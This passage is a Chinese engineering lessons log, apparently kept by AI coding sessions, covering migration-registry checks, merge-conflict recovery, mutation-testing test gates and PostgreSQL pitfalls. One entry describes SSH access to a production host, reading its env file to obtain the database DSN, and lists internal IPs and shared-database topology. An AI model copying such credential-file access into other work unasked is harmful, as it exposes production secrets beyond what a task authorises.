## 2026-10-20 — ★★★★★ **登记表存的是「版本号」还是「条数」**：判据写错会把健康的库判成坏的（三项目会话治理续做）
- 场景：memora 的 M-2 验收口径是「迁移登记表 == 仓内迁移链」。
- 实测翻车：原审计写的判据是「registry == `.up.sql` **文件个数**」⇒
  实测 registry=61、up 文件 57 个（版本 1..61 里**故意**缺 7/8/9/37）⇒
  61 ≠ 57 ⇒ **按它验收会把健康的库判成坏的**（D8′ 已在执行轮订正过这条，
  但**仓里没有任何门**去执行订正后的口径 ⇒ 订正只停在文档里）。
  1. ⭐⭐⭐⭐⭐ **读一个登记表前，先确认它存的是「编号」还是「计数」** ——
     golang-migrate 存**最大版本号**（单行 version+dirty），
     「已应用条数」是**另一件事**；
  2. ⭐⭐⭐⭐⭐ **跳号是链的合法形态** ⇒ 判据要**显式登记**跳掉的号
     （本轮 `kbmigrations.KnownGaps`）⇒ 否则「缺口」与「漏文件」分不开；
  3. ⭐⭐⭐⭐ **判据要有「反向钉住」**：专门有一条断言
     「registry == 文件个数**不成立**」⇒ 免得下一个人照着旧文档再写一道错门；
  4. ⭐⭐⭐⭐ **订正如果只停在文档里，就等于没订正** ⇒ 订正必须落成
     一个**会变红**的门（本轮：`cmd/migrate verify` + `deploy/preflight.sh` 接线）。
- 证据：`memora/internal/kbmigrations/versions.go`；`memora/cmd/migrate/main.go` 的 `verify` 子命令。
## 2026-10-20 — ★★★★ **落库的值要跟「最终状态」一致，不是跟「提议」一致**（三项目会话治理续做）
- 场景：asr 的 A-4 要让推断生产者写 `task_tags`（记下这条会话被判到哪个项目/任务）。
- 实测翻车（**本轮唯一一个真实现缺陷**）：第一版把**模型提议的 slug**
  写进标签，而不是**解析后落地的 slug** ⇒ 一条落到「未归类桶」的会话
  被记成「模型猜的那个项目名」⇒ 标签说的与实际落点**不一致**，
  而这个标签的全部价值就是「说出实际落点」。
  1. ⭐⭐⭐⭐⭐ **「提议」与「落地」是两个值** ⇒ 落库的必须是**落地后**那个
     （本轮：解析后的 project.Slug / task.Slug）；提议另有其处
     （`session_inferences` 的列存的就是提议）；
  2. ⭐⭐⭐⭐ **「未归类」也是一个答案**（"没匹配上"）⇒ 它要被**如实记下来**，
     不能被模型猜的名字顶掉；
  3. ⭐⭐⭐⭐ **写操作前问一句「这行读出来代表什么」** ⇒ 标签类写入尤其危险：
     它是**给未来的读方**看的陈述，陈述错了比没有更糟。
- 证据：`ai-session-manager/internal/projectinfer/infer.go` 的 `writeInferredTags` 注释。
## 2026-10-20 — ★★★★★ **解冲突时手写字符串拼接 = 可能把几千行文件拼没**：用 git 两侧原文重建，别用脚本「切」（三项目会话治理续做）
- 场景：并行会话同时给 `LESSONS.md` 追加条目 ⇒ 本轮 rebase 时 `LESSONS.md` 冲突。
- 实测翻车：为了「两侧都保留」，写了个 Python 脚本按 `  `>>>>>>> <sha> (message)` 三个标记**切片拼接** ⇒ 切片边界算错 ⇒
  ★ **5309 行的文件被拼成 142 行**（只剩并行会话那 8 条）⇒
  **已提交的 commit 里 LESSONS.md 少了 134 条经验**。
  ⇒ 察觉方式：`git show HEAD~1:LESSONS.md | wc -l`（5237）与
  `git show HEAD:LESSONS.md | wc -l`（142）**对不上**。
  1. ⭐⭐⭐⭐⭐ **冲突解法优先用 git 自己的两条线**：
     `git show <base>:FILE > FILE` ＋ `git show <mine>:FILE | sed -n '/<我的锚点>/,$p' >> FILE`
     ⇒ **两侧都是 git 的原文**，不经过任何字符串切割；
  2. ⭐⭐⭐⭐⭐ **冲突标记的尾部含 `sha (message)`，长度极易算错**
     ⇒ 手工切片 ⇒ 静默丢内容 ⇒ **「解完冲突」必须核对行数/条目数**；
  3. ⭐⭐⭐⭐ **收尾必查**：`git show HEAD:FILE | wc -l` vs
     `git show HEAD~1:FILE | wc -l` ⇒ **差值应当正好等于你这次加的量**；
  4. ⭐⭐⭐⭐ **本仓已有同型前科**（739d19ddb：并行合并把 429KB 的 LESSONS.md
     覆盖成 5.7KB，194 条经验丢失）⇒ ★ **LESSONS.md 是高危文件**：
     每次追加后都该核对条目数。
- 证据：本次 rebase（`git rebase origin/main` 冲突于 `LESSONS.md`）；
  修复用 `git show 6b7402054:LESSONS.md` ＋ `git show 86eb96318:LESSONS.md` 两侧重建。
## 2026-10-20 — ★★★★★ **「移植」不是「照抄」：两个仓的会话模型不同 ⇒ 同一个算法在另一个仓里是谎言**（B4 聚类本地化）
- 场景：把网关的会话聚类（`domains/analysis/clusterer.go`）完整移植到 asr，
  让 asr 自己算聚类（原来只有一条到网关的纯代理）。
- 实测翻车点：网关的**粗聚类键**是 `(user_intent, primary_model, key_topics[0])`，
  而 asr 的摘要契约**根本没有 `primary_model` 这个维度**
  （字段是 title / intent / outcome / key_points / decisions / open_questions / metrics）
  ⇒ 照抄会在分组键里保留一个**恒空的槽位**。
  1. ⭐⭐⭐⭐⭐ **移植前先比对「数据契约」，不是比对「算法」** ——
     算法是表层，**摘要/事件契约才是表层之下的语义**；契约里没有的维度，
     在对方仓里要么**删掉**（不伪造），要么**另找来源**（不许塞常量）；
  2. ⭐⭐⭐⭐⭐ **一个恒空的维度 = 分组键里的一块死重** ⇒ 它**不含信息**，
     却让「不同仓的两个实现看起来一样」⇒ 这正是「照抄」最隐蔽的失败模式：
     **代码像了，语义没跟**；
  3. ⭐⭐⭐⭐ **差异必须写进包注释**（本轮：`internal/clustering/clustering.go`），
     否则下一个读代码的人会以为「这就是网关那个算法」；
  4. ⭐⭐⭐ **不变的也要写出来**（两阶段顺序 / 阈值 0.85 / 簇 ID 形状），
     让人能判断「哪些是刻意保持一致，哪些是必然不同」。
- 证据：`ai-session-manager/internal/clustering/clustering.go` 包注释的
  「WHAT IS DIFFERENT (and why)」一节。
- 溯源：三项目会话治理 B4 轮（2026-10-20）。
## 2026-10-20 — ★★★★★ **变异要打在「策略盖不住」的那一层**：RLS 开着时，「SQL 有没有租户过滤」根本不是可观察属性（B4 变异验证）
- 场景：B4 的变异验证里，M10 把 `listClustersSQL` 的 `WHERE tenant_id = $1`
  去掉，想证明列表端点是被测试钉住的。
- 实测翻车：★ **测试仍然绿**。原因不是门坏，而是 **RLS 策略才是真正的守卫** ——
  `session_clusters` 是 `ENABLE + FORCE ROW LEVEL SECURITY` +
  `tenant_id = current_setting('app.tenant_id', true)` ⇒
  **即使查询不写租户过滤，策略照样把别人的行滤掉** ⇒
  去掉谓词 ⇒ **可观察行为一点没变** ⇒ 结论「列表端点的租户隔离被门钉住」**毫无意义**。
  1. ⭐⭐⭐⭐⭐ **判据要挑「冗余层下面那一层」** ——
     纵深防御（SQL 里的谓词）与主防线（RLS）**叠在一起时**，
     拿纵深防御当判据 = 拿一个**永远变不成红**的东西当门；
  2. ⭐⭐⭐⭐⭐ **「变异后仍绿」的第一嫌疑不是门坏，是「变异打在了冗余层」** ——
     本轮 10 条变异里 4 条没红，3 条是这个原因（另 1 条是脚本自身问题）；
  3. ⭐⭐⭐⭐ **想清楚「谁在挡」**：改谓词之前先问「除了谓词还有什么在挡？」
     （RLS / 视图 / 触发器 / 唯一约束）⇒ 挡在后面的都算「打偏了」；
  4. ⭐⭐⭐ **结论要分层写**：「谓词是纵深防御，策略才是守卫」——
     本轮把这句话写进了 `store.go` 的 SQL 注释，让下一个人不再误读。
- 证据：`scripts/audit/verify-b4-clustering.sh` 的 M10（并附了「第一版打偏了」的说明）；
  `internal/clustering/store.go` 的 `listClustersSQL` 注释。
## 2026-10-20 — ★★★★ **幂等判据看不见「不替换」**：内容派生的 ID + UPSERT 在输入不变时天然幂等 ⇒ 判据必须制造「状态消失」（B4 变异验证）
- 场景：B4 的聚类簇 ID 由**成员集**派生（`sha256(粗键|排序后的成员ID)`），
  一轮聚类**整租户替换**（不是 UPSERT）。判据写的是「跑两遍行数不变」。
- 实测翻车：★ 把「整租户替换」改成「不删除旧簇」后，**判据仍然绿** ——
  因为输入不变 ⇒ 成员集不变 ⇒ **簇 ID 也不变** ⇒ UPSERT 与替换**结果完全相同**
  ⇒ 「不替换」这条缺陷**在幂等判据下彻底隐形**。
  ⇒ ⇒ 真实后果：网关那种「UPSERT + 旧簇永远留着」的**孤儿累积**，
  在**任何幂等判据下都测不出来**。
  1. ⭐⭐⭐⭐⭐ **判据要制造「状态消失」，不是「状态重复」** ——
     「跑两遍结果一样」只能证**幂等**；「旧东西被清掉了」要靠**让旧东西消失**来证；
  2. ⭐⭐⭐⭐ **具体手法**：让被聚类的输入**少一条**（本轮：删掉一条
     `session_summaries`）⇒ 那个簇**必须消失且不留孤儿** ⇒ 立刻变红；
  3. ⭐⭐⭐⭐ **内容派生的 ID 是一把双刃剑**：它让「同一份输入 ⇒ 同一批行」
     成立（好），也让**所有「清理」类缺陷隐形**（坏）⇒ 凡是带
     「UPSERT / 替换 / 清理」字样的实现，判据里**必须有一条「消失路径」**；
  4. ⭐⭐⭐ **门要问「这条判据能区分哪两种实现」** —— 答不上来 ⇒ 它没有牙。
- 证据：`internal/clustering/clusterer_integration_test.go`
  （`TestClusteringWritesAndReadsBackThroughTheDatabase` 的第三段：
  删掉 s-3 的摘要 ⇒ 断言簇数从 2 变 1）；
  变异 M4。
## 2026-10-20 — ★★★★ **变异脚本自己也会骗人**：编译红 ≠ 断言红，「变红的是别的测试」也要拒（B4 变异 harness）
- 场景：B4 写了一个变异 harness（`scripts/audit/verify-b4-clustering.sh`），
  10 条变异里**只有 6 条真的变红**。逐条查清：**3 条是判据问题**（见上两条），
  **1 条是脚本自身的问题**。
- 实测翻车（脚本自身的两条）：
  1. ★ **M1 报的是「编译红」**：把 `return intent + "|" + topic` 改成
     `return intent` ⇒ `topic` 变量**没人用** ⇒ Go **编译失败**
     ⇒ 脚本若只认「有 FAIL 输出」就会把它算成「门有牙」
     ⇒ ★ **编译红证明的是「代码写坏了」，不是「断言抓到了」**；
  2. ★ **M2 的锚点根本不存在**：阈值常量在 `clustering.go`，脚本却去改
     `clusterer.go` ⇒ 锚点命中 **0 次** ⇒ **变异压根没发生** ⇒ 测试当然绿
     ⇒ ★ 「变异没生效」和「门没牙」在输出里**长得一模一样**（都是绿）。
- ⇒ ⇒ ★ **通用式（harness 自身的纪律）**：
  1. ⭐⭐⭐⭐⭐ **三条硬规则**：① 锚点**必须恰好命中 1 次**，否则脚本直接失败；
     ② **编译红不算数**，必须看到**预期的测试名**出现在 `--- FAIL:` 里；
     ③ **「变红的是预期集合之外的测试」也不算数**（可能是别的测试被带崩了，
     目标断言其实还绿着）⇒ 本轮脚本三条全实现了；
  2. ⭐⭐⭐⭐ **锚点用 base64 传参**（本轮 `b64()`）：源码里有 tab / 换行 /
     反引号时，shell 传参会**静默错位** ⇒ 变异打在别的地方 ⇒ 门看起来绿；
  3. ⭐⭐⭐⭐ **还原必须逐字校验（md5）**：本轮每条变异后都 `restore` 并比对
     md5，**失败的运行不会留下脏工作树**；校验要读**被改的那个路径**
     （R65 的教训：读同一个错路径 ⇒ 报出假读数）。
- 证据：`scripts/audit/verify-b4-clustering.sh` 的 `mutate` / `expect_red` /
  `restore` 三个函数及其注释。
## 2026-10-20 — ★★★★★ **「UNVERIFIED」本身要被审计**：它可能是**检索路径错了**，不是事实缺失（154 双写开关）
- 场景：§9 遗留清单里第 3 条写着「生产 252 是否已显式配置
  `storage.request_logs_write_enabled`」—— 252 与 211 都实测为 `false`，
  但 **154 标着 `UNVERIFIED`**，理由写的是「本机拿不到 154 的 DSN」。
- 实测翻车（本轮顺手关掉）：★ **154 一直都能读**。三步就拿到了：
  ① `ssh 154`（别名，端口 25022）**直接可连**；② 它的 env 在
  `/etc/llm-gateway-go/env`，DSN 的键名是 `LLM_GATEWAY_DATABASE_URL`
  （**不是** `LLM_GATEWAY_DB_DSN`）；③ 读出后发现
  **154 / 245 / 252 指向同一个 PG**（`inet_server_addr` 同为 `10.88.1.188/32`、
  postmaster 启动时间同为 `2026-10-05 15:49:43`、同一个 `llm_gateway` 库）
  ⇒ **252 那一行对三者同时成立** ⇒ 154 的开关**也是 `false`**。
  ⇒ 且 **211 是独立库**（`acc-pg17`，`172.21.0.5/32`，postmaster 2026-10-14）
  ⇒ 上一轮「252 与 211 都显式配了 false」是**两个库的两次独立确认**
  （`updated_at` 分别是 20:18:27 与 07:01:08，不同行），**结论站得住**。
- ⇒ ⇒ ★★ **本轮最扎人的一点**：★ **AGENTS.md 里早就有答案** ——
  「252 的 `pg-252-pg17` **就是** 154/245 用的库（252 宿主 IP = 172.16.2.210）」、
  「154 与 245 指向**同一个** PostgreSQL …… 按 `LLM_GATEWAY_DB_DSN` grep
  会一无所获，**这是个坑**」 ⇒ 上一轮**没先读本仓已有的答案**，直接按
  252 的路径布局去找 154 ⇒ 造出一个**假缺**。
  1. ⭐⭐⭐⭐⭐ **「UNVERIFIED」不是终点，是一个**待查的声明** —— 它同样要审计**：
     查之前先问「**是事实缺失，还是我没找到**」；
  2. ⭐⭐⭐⭐⭐ **关掉一个 `UNVERIFIED` 的正确顺序**：
     ① **先查本仓已有的答案**（AGENTS.md / LESSONS / 历史审计文档 / runbook）
     —— 重复劳动最贵的形式是「重新发现本仓已经写下的事实」；
     ② 再查**生产**（`ssh <别名>` 能不能连、env 在哪、DSN 键名叫什么）；
     ③ 最后才写「确实读不到」；
  3. ⭐⭐⭐⭐ **「读不到」与「不存在」是两件事**，而 `UNVERIFIED` 常常
     **只说了前一半** ⇒ 落表时必须写清「**读不到的是哪个东西**」
     （本轮是「DSN 路径假设错了」，不是「实例不可达」）；
  4. ⭐⭐⭐⭐ **同名主机 ≠ 同一实例**：本轮实测出 154/245/252 **共库**、
     211 **独立库** ⇒ 审计文档里沿用多轮的「三个独立生产实例」是**错的**
     ⇒ 而「双写是否下线」这个结论的**适用范围**（库级 vs 实例级）
     **完全取决于这一点** ⇒ 这类「谁是同一台」的事实该单独成节写死。
- 证据：方案文档 `docs/audit/2026-10-20-三项目会话治理-审计与执行方案.md` §9.2
  （四行拓扑表 + 读数）；`AGENTS.md` 第 32 条经验与「剩余任务」第 1 条。
## 2026-10-20 §143.35 轮 — 「零语义风险」这句话本身要被【实测修正】：它原本不是零的，而「回退」原本是假的（Seen: 1/3）
- 场景：P11（把巡检的「每小时扫 7 天基线」换成「读每日 slot 汇总表」）的仓内落地。
  设计论证（§143.31.2.2）说这是**零语义风险**（判定输入逐字相同）。
  ⇒ 我据此写迁移 + 改巡检脚本，然后**去实测** —— 结果两次都 FAIL。
- 根因（两条，都不是「写错了」，是**设计前提没被验证**）：
  ① ★★★ **「汇总表的填充范围是 `[today - N, today)`，【不含今天】」**
    ⇒ 源表路读 `now - 7 days` 起 ⇒ **含今天** ⇒ **16 行 `OLD_ONLY`，全是今天的桶**
    ⇒ ⇒ **修正 = 方案 B**：过去的天走汇总表 + 今天仍实时读源表
    （★ 今天的数据在变，本来就该实时读 —— **「不变的那部分」才是可以物化的**）；
  ② ★★★★★ **「把两路写进同一段 SQL，用 `CASE` 选」在表不存在时【行不通】**
    ⇒ 实测直接崩：`ERROR: relation "public.ursm_snapshot_slot_daily" does not exist`
    ⇒ ⇒ **根因：PG 在【规划期】就解析表名** ⇒ 即使 `WHERE 'source'='daily'`
      是常量（会被折叠），**只要 SQL 文本里出现了那个不存在的表，整条语句就报错**
    ⇒ ⇒ **⇒ 「回退机制」原本是【假的】** ⇒ 正确形态：**两段各自完整的 SQL**，shell 里二选一。
  ① ⭐⭐⭐⭐⭐ **凡是要写「零语义风险 / 判定输入不变」的，必须在【真库】上跑一遍 A/B，
     而且 A/B 要比到【判定结论】那一层**（不是只比中位数）：
     ★ 本轮的断言是 `ab_identical` / `p50_identical` / **`verdict_identical`** 三层；
  ② ⭐⭐⭐⭐⭐ **★ A/B 的夹具必须有【逐日波动】** —— 若每天行数相同，
     窗口边界的差异会被平均掉 ⇒ **测不出问题 ⇒ 假绿**
     ⇒ ⇒ ★ 夹具造数要带「昼夜节律 + 按天周内波动」；
  ③ ⭐⭐⭐⭐ **★ 「回退」必须验证【回退真的会发生】** ——
     本轮的正例：**表不存在时脚本要能跑出结论**（走源表路），
     而不只是「代码里有个 if」；
     ⇒ ⇒ ★ **验证形态：把汇总表改名 ⇒ 跑脚本 ⇒ 它必须自动回退并给出同一结论**；
  ④ ⭐⭐⭐⭐ **★ 「同一段 SQL 里写多路」在 PG 上有硬约束** ⇒
     若各路引用的对象【可能不存在】，必须拆成**多段独立 SQL**。
     ⇒ ⇒ ★ 这条不只适用于巡检脚本：**任何「表可能还没建」的 SQL 切换逻辑都要注意**；
  ⑤ ⭐⭐⭐ **判定输入的真实改动要显式登记** ——
     本轮把窗口下界从「行时间」改成「桶对齐」（边界桶从半截变整桶）
     ⇒ ⇒ ★★ **这不是「零成本改动」** ⇒ 必须写进文档并让属主拍板。
- 证据：runbook `§143.35` + 订正横幅十六（就地钉在 §143.31.2.3）；
  三道可重跑脚本 `scripts/audit/verify_892_local.sh`（10 项）、
  `verify_892_patrol_ab.sh`（3 项）、`verify_892_patrol_e2e.sh`（端到端 E2E_VERDICT）。
  门 `scripts/ursmcheck/section_14335_test.go`（19 条）⇒ 变异 M1~M39 全红。
- 溯源：llm-gateway-go4 §143.35 轮（2026-10-20）。
## 2026-10-20 §143.35 轮 — PG 在【规划期】解析表名 ⇒「常量折叠」救不了「表不存在」（Seen: 1/3）
- 场景：巡检脚本要按「汇总表在不在」选两段 SQL 之一。
  我最初写成「同一段 SQL 里用 `CASE` + `WHERE 'source'='daily'` 选」
  ⇒ 以为常量会在规划期被折叠、不存在的表就不会被解析。
- 根因（一行）：★ **PG 在【规划期】就要把表名解析成 OID** ⇒
  ⇒ 表不存在 ⇒ **`relation ... does not exist`** ⇒ ⇒ **整条语句失败**，
  ⇒ ⇒ **常量条件根本来不及生效**。
  ① ⭐⭐⭐⭐⭐ **判别动作**：问「这条 SQL 里引用的对象，【可能不存在】吗？」
     ⇒ 是 ⇒ **不能靠条件表达式绕** ⇒ 必须**拆成多段独立的 SQL**；
  ② ⭐⭐⭐⭐ **凡是有「A 方案 / B 方案」且引用对象存在性不确定 ⇒
     在【shell 层】选 SQL 文本**，而不是在 SQL 层用 CASE；
  ③ ⭐⭐⭐⭐ ★ 顺带记一条 bash 的坑：`[ a <= b ]` 在 bash 里会被解析成**两个参数**
     （报「需要二元运算符」）⇒ 日期比较只能用 `<` 与 `=`（两个都是 YYYY-MM-DD ⇒ 字典序 == 日期序）。
- 证据：runbook `§143.35`；门 `TestSection14335PatrolHasTwoIndependentSQL`（变异 M31~M34）。
## 2026-10-20 §143.35 轮 — 迁移的「登记点」是 5 处注册点 + 2 处台账，漏一处 = 升级库上被静默跳过（Seen: 1/3）
- 场景：写迁移 892（URSM 巡检的每日 slot 汇总表）并登记。
  我登记了 installer 的 `main.go`（`//go:embed` + 投递映射）与 `runner.go`（`StartupFiles`），
  写完迁移、跑完门、跑完「整包回归」⇒ 一切绿 ⇒ 以为落地了。
- 根因（一条）：★ **「登记」不是「加一行」，是「把迁移送进【每一条执行通道】」**。
  一个迁移要真正被跑到，需要同时出现在【5 处注册点 + 2 处台账】里：
  ① `installer/cmd/llm-gw-installer/main.go` 的 `//go:embed`；
  ② 同文件的投递映射 map 条目；
  ③ `installer/internal/dbinit/runner.go` 的 `StartupFiles`；
  ④ `installer/cmd/llm-gw-installer/embeddata/startup/` 的**逐字相同**副本；
  ⑤ `scripts/apply-db-revision-sequence.sh` 的 `files=()`（**升级库通道**）；
  台账 2 处：`sql/schema/installed_startup_migrations.tsv`
  （**派生文件 ⇒ 用它自己的 `-update` 命令重建，别手改**）
  + `docs/db-changelog.md`（**sha 必须是文件实测值**）。
  ⇒ ⇒ ★★ **我漏了 ⑤ 与两个台账 ⇒ 迁移在升级库上会被【静默跳过】**
  （投递脚本 warn-only + 部署侧只查文件存在 ⇒ 没有报错、没有告警、没有任何信号）。
  ① ⭐⭐⭐⭐⭐ **迁移交付前把「5 处注册点 + 2 处台账」当 checklist 逐条划掉** ——
     不是「我记得加过了」，而是「我【现场核对过每一处】」。
  ② ⭐⭐⭐⭐⭐ **★ 门要住在「默认会跑的那个包」里** ——
     本轮 TSV 那条其实**是有门的**（`installer/internal/dbinit/startup_manifest_test.go`），
     但它**不在 `./scripts/ursmcheck/` 的回归范围内** ⇒
     ⇒ ★★ **「整包回归全绿」≠「所有包都跑过了」**
     ⇒ ⇒ 一个门住在哪个包，决定了它**默认会不会被执行**
     ⇒ ⇒ **跨包的断言要在一个「大家都会跑」的包里再做一份**。
  ③ ⭐⭐⭐⭐ **★ 缺口的暴露方式各不相同 ⇒ 要分别确认「它到底会不会被抓到」**：
     本轮 TSV 被 manifest 门抓、db-changelog 被 sqlguard 的连续性门抓、
     而投递通道 `files=()` **当时没有任何门能抓** ⇒ ⇒
     ⇒ ★★★ **死缺口只能自己补门**，不能指望别的包的测试顺带发现。
  ④ ⭐⭐⭐⭐ **Contains 型门只保护「至少有一处」** ⇒ 断言里改用
     `strings.Count(body, needle) != 1` ⇒ **强制 needle 唯一** ⇒ 杜绝假绿。
  ⑤ ⭐⭐⭐ **派生文件用它的生成命令重建，别手改** ——
     `installed_startup_migrations.tsv` 的文件头自己写着「DO NOT EDIT BY HAND」；
     ★ 实测重建后 diff **只新增 1 行**（后续索引整体 +1，头部未变）⇒ 可核对。
  ⑥ ⭐⭐⭐ **注释里的「依赖某某迁移建的」本身也是断言** ——
     本轮 `runner.go` 原写「源表 `ursm_node_snapshot_min` 由 453/818 建」，
     实测 **453 未在任何通道登记**（它已被 baseline `sql/schema/01-schema.sql` 吸收）
     ⇒ ⇒ 写依赖前要**现场查那一条是否真在通道里**，
     而不是看它躺在 `sql/migrations/startup/` 目录下就算数。
- 证据：runbook `§143.35.4`；门 `scripts/ursmcheck/section_14335_test.go`
  （**21 条**；登记点断言 6 条 / 5 个文件 + embeddata 字节一致 + 台账 sha 实测）
  ⇒ 变异 **M1~M44 全红且按预期红**。
## 2026-10-20 §143.35 轮 — 改一条守护 P0 的门，必须用变异证明「力量没被削弱」（Seen: 1/3）
- 场景：新增迁移 892 后，`sql/migrations/startup` 的门
  `TestUpMigrationsDoNotRecreateTheBrokenShape` 判红（我的迁移撞上了它）。
  ⇒ 我把它的取法收窄了（把主键提取限定到该表自身的声明语句）。
- 根因（一行）：★ **那门原本的取法是「文件里【第一个】PRIMARY KEY」** ⇒ 范围过宽
  ⇒ 凡「建了另一张带主键的表、又提到目标表」的迁移都误判
  ⇒ ⇒ **这不是「一次误伤」，是留给下一个人的同类陷阱**。
  ① ⭐⭐⭐⭐⭐ **改一条守护真实事故的门，必须用变异证明力量没被削弱** ——
     「让门变绿」≠「把门变准」，**前者容易得多**。
     ⇒ 本轮三条：N1 摘掉真凶的登记项 ⇒ 必须红；
     N2 把另一条的正向形态改坏 ⇒ 必须红；
     N3 把真凶改成正确形态 ⇒ 必须绿（证明判据是**数据驱动**的，不是按文件名背书）。
  ② ⭐⭐⭐⭐ **收窄一条门时，要逐条列出「谁仍然被抓 / 谁不再被抓」并逐条实测** ——
     本轮：453（真凶）仍被抓 ✔、463/830 仍 OK ✔、818/875 跳过 ✔、892 跳过 ✔。
  ③ ⭐⭐⭐⭐ **★ 「提到某张表」≠「声明某张表」** ——
     量具的**判别对象**必须与它的**判据意图**一致：
     本门要判的是「这张表的主键被声明成坏形态」，
     ⇒ 取值就必须来自**这张表的声明语句**，而不是文件里的任意一个主键。
  ④ ⭐⭐⭐ **做括号配对，不要一路正则扫** ——
     PG 的列类型自带括号（`numeric(10,2)`）、默认值可能是表达式（`DEFAULT (now())`）
     ⇒ 正则扫到的位置未必是建表语句的主键。
  ⑤ ⭐⭐⭐ **门判红时先问「是产品错还是量具错」** ——
     本轮：产品没错（892 是新表），是**量具范围过宽** ⇒
     ⇒ ★★ 而「量具过宽」往往意味着「下一个人的迁移会撞上同一堵墙」。
  ⑥ ⭐⭐⭐ **「回归全绿」要问「在哪个提交上全绿」** ——
     本轮 `internal/sessionv2mirror` 3 条红，**在干净 HEAD 上同样红** ⇒ 既有失败，
     如实登记而不是含糊带过。
- 证据：runbook `§143.35.5` / `§143.35.6`；
  变异脚本 `mutation_up_gate_narrow.py`（N1~N3，3/3 按预期，postflight 逐字还原）。
## 2026-10-20 §143.35 轮 — 两行台账抢同一个迁移号时，先定【哪个号是权威】（Seen: 1/3）
- 场景：推送前 rebase，共享仓库已前进 15 个提交 ⇒ `docs/db-changelog.md` 冲突。
  解完发现**两行台账都写着 892**：一行是上游的
  「`| 892 | 890_drop_request_logs_v1_family.sql |`」，一行是我这轮的
  「`| 892 | 892_ursm_snapshot_slot_daily.sql |`」⇒ **撞号**。
- 根因（一行）：★ 上游提交 `7de986e78` 改了那一行的**编号列**（890 → 892），
  却**没改文件名、没改 TSV、没改 StartupFiles、没改行内自述**
  ⇒ ⇒ **一个事实源说 892，四个事实源说 890** ⇒ ⇒ 少数派那一列是笔误。
- 防复发检查：
  ① ⭐⭐⭐⭐⭐ **两行抢同一个迁移号 ⇒ 不要「选一行」** ——
     先列**事实源清单**并逐个取值（**磁盘文件名 / TSV / 注册表 / 行内自述 / 生产台账**）
     ⇒ **多数一致的那个是权威** ⇒ ⇒ 少数派那一列是笔误。
  ② ⭐⭐⭐⭐⭐ **★ 订正前还要问一句：「改号/改名会不会动到生产？」** ——
     本例：生产已应用过 `890_...sql`（台账里 `applying …/890_…`）
     ⇒ ★ **文件名被生产 checksum 台账【冻结】** ⇒ 改名会让台账文件名失配 ⇒ **有重放风险**
     ⇒ ⇒ ⇒ **只订正台账列，不动文件名**。
  ③ ⭐⭐⭐⭐ **rebase 冲突里「派生文件」要用它的生成命令重建，别手改** ——
     本例 `installed_startup_migrations.tsv` 头写着「DO NOT EDIT BY HAND」
     ⇒ `-update` 重建后 296 条（892@284、893@295）⇒ 无冲突标记。
  ④ ⭐⭐⭐⭐ **追加型文件（LESSONS / 台账）的冲突只能「两侧全保留」** ——
     选一侧 = 蒸发另一会话的过程记录 ⇒ ⇒ 解完必须**逐行核对「每一侧的每一行都还在」**。
  ⑤ ⭐⭐⭐ **上游的笔误也会撞上你的号** ⇒ ⇒ 合并后要**重新扫一遍同号行**，
     不能只看自己那几行。
- 证据：runbook `§143.35.7`；订正后 postflight 断言全过（无「编号 892 指向 890 文件」的残留、
  890 行恰好 1 行、891 行恰好 1 行且引用 890、本轮 `| 892 |` 行恰好 1 行）。

## 2026-10-20 §143.35 轮 — 改检测口径必须【双向验】：既不漏真阳性，也不误伤散文引用（Seen: 1/3）

- 场景：rebase 后 `scripts/ursmcheck` 判红「LESSONS.md 里还有合并冲突标记 "<<<<<<< "」。
  ⇒ 我把门从**子串**口径改成**行首锚定**口径。
- 根因（一行）：★ 原口径是 `strings.Contains(text, "<<<<<<< ")` ⇒
  ⇒ **把正文里【引用】这些标记的散文也判成冲突**
  ⇒ ⇒ 实测踩到的那段是**上游自己写的**（他们记自己写过一个按三个标记切片拼接的脚本）
  ⇒ ⇒ **「文档里提到冲突标记」≠「文档里有冲突标记」**。
- 防复发检查：
  ① ⭐⭐⭐⭐⭐ **改一条门的【检测口径】必须双向验** ——
     「把门改得不那么红」比「把门改对」容易得多 ⇒ 两条都要跑：
     ★ **P1 真阳性**（行首注入真冲突标记 ⇒ 必须仍红）—— 否则门变成了恒绿门；
     ★ **P2 阳性对照**（保留行中的散文引用 ⇒ 必须仍绿）—— 否则口径没改对。
  ② ⭐⭐⭐⭐ **判「有没有 X」时，X 的【判别形态】要选【真 X 才有的那种形态】** ——
     git 的冲突标记**必在第 0 列** ⇒ 行首锚定既不漏真冲突、又不误伤行中引用。
  ③ ⭐⭐⭐⭐ **门判红先问「是产物坏了还是量具口径错了」** ——
     本轮产物（LESSONS.md）没坏，坏的是**量具口径**；
     ⇒ ★★ 而这类误判**只有在别人的内容进仓时才暴露**
     ⇒ ⇒ **共享仓库里，别人写的散文会撞上你写的门**。
  ④ ⭐⭐⭐ **修完要在【干净副本】上复核「它本来是不是就红」** ——
     本轮用 `git worktree` 拉 origin/main 复核 ⇒ 同样红 ⇒ 既有红，不是本轮引入。
- 证据：runbook `§143.35.9`；P1/P2 双向验证（RED/GREEN 各一，postflight 逐字还原）。
- 溯源：llm-gateway-go4 §143.35 轮（2026-10-20）。

## 2026-10-21 — ★★★★★ **判据要「继承」既有纪律，不能靠记忆**：同一个仓里已有 4 处剥注释，第 5 处新门没照做 ⇒ 坑原地复活（llm-gateway-go R51 续轮）

- 场景：审计 `candidate_failure_monitor` 的「S4 停写假阳性二分类」门（R68 写的），
  顺手给它写变异脚本 ⇒ **实测发现那条门没有牙**：把日志里的两个诊断字段
  （`source_max_failure_id` / `source_max_request_id`）换成不含目标词的形状
  ⇒ **门仍然全绿**。
- 根因（两重，**第二重是本轮新学到的**）：
  1. ⭐⭐⭐⭐⭐ `checkStaleness` 的**注释**里就写着「两个诊断字段透传」
     ⇒ 对**原始文本**做的 `strings.Contains` 断言**可以被注释满足**；
  2. ⭐⭐⭐⭐⭐ ★★ **被提取的「函数体」里还包含 `const sourceMaxRequestIDKey = "source_max_request_id"`
     这一行**（它在 `checkStaleness` 之后、下一个 `func ` 之前 ⇒ 被「到下一个 func 为止」的
     提取规则一并吞进来了）⇒ 光靠「这个字面量出现过」，连**常量声明**都能满足。
     ⇒ ⇒ **needle 必须钉「键值对形状」（key + value 变量）**，那种形状只出现在日志调用里。
- ⇒ ⇒ ★ **通用式**：
  1. ⭐⭐⭐⭐⭐ **纪律不会自动覆盖新写的门** ⇒ 本仓当时**已经有 4 处**实现了
     「剥注释后再断言」（`cmd/gateway/dual_read_gate_test.go`、
     `cmd/tools/validate_sessions_v2/loader_test.go`、`autoupdate/testschema_guard_test.go`、
     `admin/degrade_marker_test.go`），**每一处的注释都写着同一句话**
